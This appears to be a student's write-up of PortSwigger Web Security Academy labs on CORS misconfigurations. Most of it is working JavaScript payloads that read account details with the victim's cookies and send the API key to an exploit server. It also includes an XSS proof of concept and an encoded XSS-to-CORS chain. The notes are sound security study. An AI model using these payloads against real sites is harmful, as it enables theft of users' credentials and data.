# CORS

- https://portswigger.net/web-security/cors
- https://portswigger.net/web-security/cors/same-origin-policy
- https://portswigger.net/web-security/cors/access-control-allow-origin

## CORS vulnerability with basic origin reflection

When `Origin` header is added, it is being reflected to `ACAO` header either way. Accessing the response is acceptable. Only thing is to specify including credentials (cookies).

Deliver to victim:

```
<script>
const tmp = async () => {
    var r = await fetch("https://0a5300a704e0f23c82a3470c004d003f.web-security-academy.net/accountDetails", {credentials: "include"}); 
    var j = await r.json(); 
    fetch("https://exploit-0a6b001f047ff2d5823d469b01b8001c.exploit-server.net/exploit?q=" + j.apikey)
}
tmp()
</script>
```

Above request add `Origin` header automatically, which is reflected into `ACAO` header.

From what I assume, if there is no `Access-Control-Allow-Origin` in the response, results of it could not be access from the js. So here making request with `mode: "no-cors"`, makes it not append `Origin` header, which prevent it from being reflected into `ACAO`, which stops js execution

Solution via portwigger:

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

## CORS vulnerability with trusted null origin

Playing around with `GET /accountDetails` request:
 - Not specifing the `Origin` header, respond without `ACAO` header
 - Specifing `https://0ab900a703040b268435609a00610045.web-security-academy.net` as `Origin` reflects it in `ACAO`
 - Specifing `Test` as `Origin` respond without `ACAO` header
 - Specifing `null` as `Origin` reflects it in `ACAO`

So triggering the request with `Origin: null` will allow us to access the data.

Including our script in this `iframe` will cause the origin to be `null`. Deliver this to the victim:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
const tmp = async () => {
    var r = await fetch('https://0ab900a703040b268435609a00610045.web-security-academy.net/accountDetails', {credentials: 'include'})
    var j = await r.json()
    fetch('https://exploit-0a650065038d0bee84425f1301cb00c5.exploit-server.net/exploit?q=' + j.apikey)
}
tmp()
</script>"></iframe>
```

Alternative Portswigger solution:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

## CORS vulnerability with trusted insecure protocols

Check stock functionality works in `stock` subdomain. `GET /` request accept two parameters and of them is being reflected into the page without encoding, making it vulnerable to XSS. POC:

```
https://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1
```

Checking `GET /accountDetails` at main domain: providing `Origin` header set to `https://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net` respond with reflected `ACAO` header. Other values does not get reflected.

Additionally the servers responds with `AC-With-Credentials: true`, so it makes the attack possible, because the cookies with be sent with the requests.

Script that gets the cookie and sends it to the Explot Server at stock subdomain when passed as `productId`:

```
<script>
const tmp = async () => {
    var r = await fetch("https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails", {credentials: "include"});
    var j = await r.json();
    document.location = ("https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?q=" + j.apikey);
};
tmp();
</script>
```

Deliver to victim and read the apikey from the Explot Server Access logs:

```
<script>
document.location = 'https://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=3%3Cscript%3E%20const%20tmp%20=%20async%20()%20=%3E%20{%20var%20r%20=%20await%20fetch(%22https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails%22,%20{credentials:%20%22include%22});%20var%20j%20=%20await%20r.json();%20document.location%20=%20(%22https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?q=%22%20%2b%20j.apikey);%20};%20tmp();%20%3C/script%3E&storeId=1'
</script>
```

For some reason my solution do not work. Tests in my browser were successfull, but delivering the explot to the victim did not work. Doing it like solution suggested:

```
<script>
    document.location="http://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
